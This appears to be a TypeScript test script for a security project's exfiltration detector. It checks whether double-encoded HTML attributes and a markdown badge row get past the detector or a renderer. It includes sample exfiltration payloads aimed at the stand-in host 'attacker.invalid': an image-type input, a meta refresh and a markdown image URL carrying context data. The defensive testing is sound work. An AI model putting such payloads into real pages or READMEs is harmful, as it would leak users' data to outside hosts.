// T72 — two small residual questions.
//   1. The gate decodes with MAX_DECODE_PASSES=3 (a fixed point or 3 passes),
//      but an HTML tokenizer decodes an attribute value ONCE. Does the extra
//      pass create a gate false positive a renderer never sees?
//   2. The real-world carrier for the linked-image class: a shields.io badge
//      row, the shape every README opens with.
// Oracle: Bun HTMLRewriter (lol-html) for the tokenizer value; `marked` for the
// markdown. Read-only, offline, synthetic hosts only.
// Usage: bun T72-extra.ts
import { marked } from "marked";
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

async function tokenizerAttribute(html: string, tag: string, name: string): Promise<string | null> {
  let value: string | null = null;
  await new HTMLRewriter()
    .on(tag, { element(el) { if (value === null) value = el.getAttribute(name); } })
    .transform(new Response(html))
    .text();
  return value;
}

// 1. double-decoding vs a single tokenizer pass
for (const [id, text] of Object.entries({
  singlePass: `<input type="&#105;mage" src="${U}">`,
  doubleEncoded: `<input type="&amp;#105;mage" src="${U}">`,
  doubleEncodedMeta: `<meta http-equiv="&amp;#114;efresh" content="0;url=${U}">`,
})) {
  const tag = text.startsWith("<input") ? "input" : "meta";
  const attr = tag === "input" ? "type" : "http-equiv";
  const decodedOnce = await tokenizerAttribute(text, tag, attr);
  const n = detectExfil(text, []).length;
  console.log(
    `${id.padEnd(18)} tokenizerValue=${JSON.stringify(decodedOnce)} rendererGateOpen=${JSON.stringify(decodedOnce) === '"image"' || JSON.stringify(decodedOnce) === '"refresh"'} detectorFindings=${n}`,
  );
}

// 2. the real-world linked-image carrier
const badgeRow =
  `# keryx\n\n[![build](${U})](https://ci.example.com/job) ` +
  `[![coverage](https://cdn.example.org/cov.svg)](https://cov.example.com)\n`;
const html = String(await marked.parse(badgeRow, { async: true }));
const imgSrcs = [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/gi)].map((m) => m[1] ?? "");
console.log(
  `badgeRow rendererImgSrcs=${JSON.stringify(imgSrcs)} detectorFindings=${detectExfil(badgeRow, []).length}`,
);
